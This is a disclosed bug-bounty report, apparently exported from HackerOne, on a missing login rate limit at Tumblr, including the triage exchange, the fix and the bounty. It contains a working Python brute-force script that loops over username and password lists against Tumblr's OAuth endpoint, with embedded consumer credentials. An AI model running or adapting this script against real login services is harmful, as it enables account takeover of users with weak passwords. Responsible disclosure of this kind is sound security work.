{"id":708917,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MDg5MTc=","url":"https://hackerone.com/reports/708917","title":"Rate Limit Misconfiguration on tumblr login .","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2019-10-07T13:01:27.908Z","submitted_at":"2019-10-07T13:01:27.908Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"u0pattern","url":"/u0pattern","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/h8tA4uqekdDbdhAzpbxDSud4/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":111,"url":"https://hackerone.com/automattic","handle":"automattic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Automattic","twitter_handle":"","website":"https://automattic.com","about":"WordPress.com, VaultPress, Akismet, Gravatar, WooCommerce, Polldaddy, Tumblr and more!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-11-13T17:06:07.916Z","bug_reporter_agreed_on_going_public_at":"2020-10-14T17:06:04.291Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nThe Rate Limit should always be on the login endpoint and have an acceptable limit, for example, 20 rate limit, but when there is no limit or the limit is huge, for example, 5000, this is certainly dangerous because it is a Rate Limit Misconfiguration, [for example](https://hackerone.com/reports/385381) .\n\n--------------\n## PoC :\n```python\nimport requests,requests_oauthlib\n########################################################################\noauth_consumer_key = 'BUHsuO5U9DF42uJtc8QTZlOmnUaJmBJGuU1efURxeklbdiLn9L'\noauth_consumer_secret = 'olOu3aRBCdqCuMFm8fmzNjMAWmICADSIuXWTnVSFng1ZcLU1cV'\n# https://github.com/kennydude/tumblr-client/blob/master/common.php#L89\n########################################################################\nurl = 'https://www.tumblr.com/oauth/access_token'\nusers = open('users.txt','r').read().splitlines()\npasswords = open('passwords:.txt','r').read().splitlines()\nfor user in users:\n\tfor p4ss in passwords:\n\t\tdata_p = 'x_auth_username='+user+'\u0026x_auth_password='+p4ss+'\u0026x_auth_mode=client_auth'\n\t\ta = requests.post(url,auth=requests_oauthlib.OAuth1(oauth_consumer_key,oauth_consumer_secret,decoding=None),data=data_p).text\n\t\tprint(a)\n```\n\n--------\n\n## Impact\n\nThe attacker can access to many accounts whose passwords are weak .","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-11-13T17:06:04.388Z","allow_singular_disclosure_after":-28678395.633679435,"singular_disclosure_allowed":true,"vote_count":19,"voters":["najeh_halawani","prophet","ali","0xelkomy","rahulkadavil_","0nlymohammed","idiablos","yusuf_furkan","akashhamal0x01","cryptographer","and 9 more..."],"structured_scope":{"databaseId":42403,"asset_type":"URL","asset_identifier":"www.tumblr.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5977149,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your submission. Your report will be reviewed and we'll get back to you shortly.","automated_response":false,"created_at":"2019-10-07T13:57:55.967Z","updated_at":"2019-10-07T13:57:55.967Z","actor":{"username":"tumblr-waffles","cleared":false,"url":"/tumblr-waffles","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/293/783/e27dc5d5108be2b920899d3754d6be8207d4cac2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5977188,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"██████\n\nI forget to put it in the report .","automated_response":false,"created_at":"2019-10-07T14:04:10.233Z","updated_at":"2020-10-14T20:01:43.169Z","actor":{"username":"u0pattern","cleared":false,"url":"/u0pattern","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/h8tA4uqekdDbdhAzpbxDSud4/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5977548,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"@0x1337r00t Based on your initial description, there do not appear to be any security implications as a direct result of this behavior. More specifically, your report is outlining the lack of a rate limit for repeatedly logging in **successfully** to an individual account. In general, security concerns surround failed login attempts or successful logins spreading across numerous accounts - not successful logins to the same account only.\n\nIf you disagree, please reply with additional information describing your reasoning; otherwise, please feel free to self-close your report =]\n","automated_response":false,"created_at":"2019-10-07T14:47:08.542Z","updated_at":"2019-10-07T14:47:08.542Z","actor":{"username":"tumblr-waffles","cleared":false,"url":"/tumblr-waffles","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/293/783/e27dc5d5108be2b920899d3754d6be8207d4cac2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5978308,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"██████\n`there do not appear to be any security implications as a direct result of this behavior.`\n\n`your report is outlining the lack of a rate limit`\n\n`ecurity concerns surround failed login attempts or successful logins spreading across numerous accounts - not successful logins to the same account only.`","automated_response":false,"created_at":"2019-10-07T16:07:33.973Z","updated_at":"2020-10-14T20:03:07.314Z","actor":{"username":"u0pattern","cleared":false,"url":"/u0pattern","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/h8tA4uqekdDbdhAzpbxDSud4/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5978376,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"`not successful logins to the same account only.` :-\n```python\nimport requests,requests_oauthlib\n########################################################################\noauth_consumer_key = 'BUHsuO5U9DF42uJtc8QTZlOmnUaJmBJGuU1efURxeklbdiLn9L'\noauth_consumer_secret = 'olOu3aRBCdqCuMFm8fmzNjMAWmICADSIuXWTnVSFng1ZcLU1cV'\n# https://github.com/kennydude/tumblr-client/blob/master/common.php#L89\n########################################################################\nurl = 'https://www.tumblr.com/oauth/access_token'\nusers = open('users.txt','r').read().splitlines()\npasswords = open('passwords.txt','r').read().splitlines()\nfor user in users:\n    for p4ss in passwords:\n        data_p = 'x_auth_username='+user+'\u0026x_auth_password='+p4ss+'\u0026x_auth_mode=client_auth'\n        a = requests.post(url,headers={'X-Bug-Bounty':'HackerOne-0x1337r00t'},auth=requests_oauthlib.OAuth1(oauth_consumer_key,oauth_consumer_secret,decoding=None),data=data_p).text\n        if 'Invalid xAuth credentials.' in a:\n\t\t\tprint(\"(\"+user+\":\"+p4ss+\") -\u003e Failed\")\n\t\telse:\n\t\t\tprint(\"(\"+user+\":\"+p4ss+\") -\u003e successful login\")\n```","automated_response":false,"created_at":"2019-10-07T16:13:41.711Z","updated_at":"2019-10-07T16:13:41.711Z","actor":{"username":"u0pattern","cleared":false,"url":"/u0pattern","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/h8tA4uqekdDbdhAzpbxDSud4/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5978607,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"{F601649}","automated_response":false,"created_at":"2019-10-07T16:31:53.168Z","updated_at":"2019-10-07T16:31:53.168Z","actor":{"username":"u0pattern","cleared":false,"url":"/u0pattern","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/h8tA4uqekdDbdhAzpbxDSud4/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":601649,"filename":"PoC.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ejzC1s9qGyEyDeNc8usVjkFs?response-content-disposition=attachment%3B%20filename%3D%22PoC.mp4%22%3B%20filename%2A%3DUTF-8%27%27PoC.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151920Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=9a10e58664815d59542aa3d8227a5b2149fda2b5bc3bfa0e79c48de71079a431"}],"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5979763,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"@0x1337r00t Apologies for my initial reply, the misunderstanding was on my side of the screen - it looks like our rate limiting for that exact feature has been disabled recently for currently unknown reasons.\n\nThat said, we were able to reproduce the issue that you have outlined and are working on a fix. Please sit tight and we'll get back to you when we have an update!","automated_response":false,"created_at":"2019-10-07T18:57:55.529Z","updated_at":"2019-10-07T18:57:55.529Z","actor":{"username":"tumblr-waffles","cleared":false,"url":"/tumblr-waffles","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/293/783/e27dc5d5108be2b920899d3754d6be8207d4cac2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5980157,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tumblr-waffles Don't think about it, Thanks for triage \u003c3","automated_response":false,"created_at":"2019-10-07T19:51:29.505Z","updated_at":"2019-10-07T19:51:29.505Z","actor":{"username":"u0pattern","cleared":false,"url":"/u0pattern","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/h8tA4uqekdDbdhAzpbxDSud4/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5980607,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@0x1337r00t Hi, we believe we have patched the vulnerability as described. Could you please verify that it is resolved?","automated_response":false,"created_at":"2019-10-07T21:08:37.019Z","updated_at":"2019-10-07T21:08:37.019Z","actor":{"username":"tumblr-waffles","cleared":false,"url":"/tumblr-waffles","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/293/783/e27dc5d5108be2b920899d3754d6be8207d4cac2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5980764,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"```json\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\nInvalid xAuth credentials.\n{\"meta\":{\"status\":429,\"msg\":\"Limit Exceeded\"},\"response\":[],\"errors\":[{\"title\":\"Limit Exceeded\",\"code\":0,\"detail\":\"Tumblr went thud. Try again.\"}]}\n{\"meta\":{\"status\":429,\"msg\":\"Limit Exceeded\"},\"response\":[],\"errors\":[{\"title\":\"Limit Exceeded\",\"code\":0,\"detail\":\"Something broke. Try again.\"}]}\n{\"meta\":{\"status\":429,\"msg\":\"Limit Exceeded\"},\"response\":[],\"errors\":[{\"title\":\"Limit Exceeded\",\"code\":0,\"detail\":\"Unknown error. Try again.\"}]}\n{\"meta\":{\"status\":429,\"msg\":\"Limit Exceeded\"},\"response\":[],\"errors\":[{\"title\":\"Limit Exceeded\",\"code\":0,\"detail\":\"Internet strangeness. Try again.\"}]}\n```\nFixed @tumblr-waffles .","automated_response":false,"created_at":"2019-10-07T21:40:12.867Z","updated_at":"2019-10-07T21:41:08.572Z","actor":{"username":"u0pattern","cleared":false,"url":"/u0pattern","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/h8tA4uqekdDbdhAzpbxDSud4/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5980785,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@0x1337r00t Thank you again for your submission! We will now review everything regarding bounty eligibility and will get back to you soon.","automated_response":false,"created_at":"2019-10-07T21:44:14.018Z","updated_at":"2019-10-07T21:44:14.018Z","actor":{"username":"tumblr-waffles","cleared":false,"url":"/tumblr-waffles","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/293/783/e27dc5d5108be2b920899d3754d6be8207d4cac2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"u0pattern","url":"/u0pattern"},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5996369,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @0x1337r00t, we would like thank you again for your submission and helping make Tumblr a safer place. We look forward to more reports from you in the future.","automated_response":false,"created_at":"2019-10-09T15:59:29.808Z","updated_at":"2019-10-09T15:59:29.808Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Automattic"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"automattic","collaborator":{"username":"u0pattern","url":"/u0pattern"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9523653,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Please hide [my IP](https://hackerone.com/reports/708917#activity-5977188) and this [comment](https://hackerone.com/reports/708917#activity-5978308)\n\nThank you","automated_response":false,"created_at":"2020-10-14T17:06:04.317Z","updated_at":"2020-10-14T17:06:04.317Z","first_to_agree":true,"actor":{"username":"u0pattern","cleared":false,"url":"/u0pattern","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/h8tA4uqekdDbdhAzpbxDSud4/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9816287,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-11-13T17:06:07.953Z","updated_at":"2020-11-13T17:06:07.953Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Automattic"}},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}